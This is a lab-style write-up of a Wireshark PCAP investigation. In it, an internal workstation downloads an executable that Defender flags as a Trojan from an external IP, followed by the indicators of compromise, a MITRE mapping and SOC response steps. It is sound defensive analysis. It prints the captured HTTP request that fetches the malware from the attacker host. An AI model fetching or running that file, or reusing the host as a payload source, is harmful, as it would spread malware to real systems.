@@ -1,0 +1,94 @@
+PROJECT 3 — NETWORK THREAT HUNTING & PCAP ANALYSIS
+
+Objective
+Analyze a network capture using Wireshark to identify suspicious network activity,
+investigate an executable transfer, identify network indicators, and assess the
+potential threat.
+
+PCAP
+File: 2026-10-01-traffic-analysis-exercise.pcap
+Packets: 42,497
+
+Internal Host
+10.10.1.128
+
+CONFIRMED SUSPICIOUS ACTIVITY
+
+Source: 10.10.1.128
+Destination: 107.175.82.242
+Destination Port: 9000
+Protocol: HTTP
+
+HTTP Request
+GET /wilow/runner_ilove.exe HTTP/1.1
+Host: 107.175.82.242:9000
+User-Agent: curl/8.21.0
+
+Server Response
+HTTP/1.1 200 OK
+Content-Length: 1646592
+Content-Type: application/octet-stream
+
+The HTTP response began with the MZ signature, indicating a Windows PE
+executable.
+
+MALWARE ANALYSIS
+
+The executable runner_ilove.exe was exported from the HTTP stream using
+Wireshark.
+
+Windows Defender subsequently quarantined the exported file and identified it as:
+
+Trojan:Win64/Zusy.ARAX!MTB
+
+Defender reported that the program was dangerous and could execute commands
+from an attacker.
+
+INDICATORS OF COMPROMISE
+
+IP Address: 107.175.82.242
+Filename: runner_ilove.exe
+URL Path: /wilow/runner_ilove.exe
+Destination Port: 9000
+Protocol: HTTP
+
+MITRE ATT&CK
+
+T1105 — Ingress Tool Transfer
+
+C2 ASSESSMENT
+
+The exercise material referenced 195.64.128.106 as a potential C2 indicator.
+Direct filtering for 195.64.128.106 in Wireshark returned zero packets.
+
+Therefore, communication with 195.64.128.106 could not be independently
+confirmed from the captured traffic and was excluded from the confirmed findings.
+
+ANALYST ASSESSMENT
+
+The PCAP provides strong evidence that internal workstation 10.10.1.128
+retrieved a suspicious Windows executable from external host 107.175.82.242
+over HTTP port 9000.
+
+The executable was successfully reconstructed from the HTTP stream and was
+subsequently detected and quarantined by Windows Defender as
+Trojan:Win64/Zusy.ARAX!MTB.
+
+SOC RESPONSE
+
+1. Isolate the affected workstation.
+2. Preserve the PCAP and endpoint evidence.
+3. Investigate and block 107.175.82.242 as appropriate.
+4. Search endpoint telemetry for execution of runner_ilove.exe.
+5. Review the host for persistence and follow-on activity.
+6. Perform malware analysis only in an isolated environment.
+7. Monitor for additional connections to the identified IOC.
+
+CONCLUSION
+
+The investigation demonstrated network threat hunting using Wireshark,
+identification of suspicious HTTP traffic, executable extraction, IOC
+identification, and endpoint malware detection.
+
+The investigation also distinguishes confirmed packet evidence from
+unverified indicators.
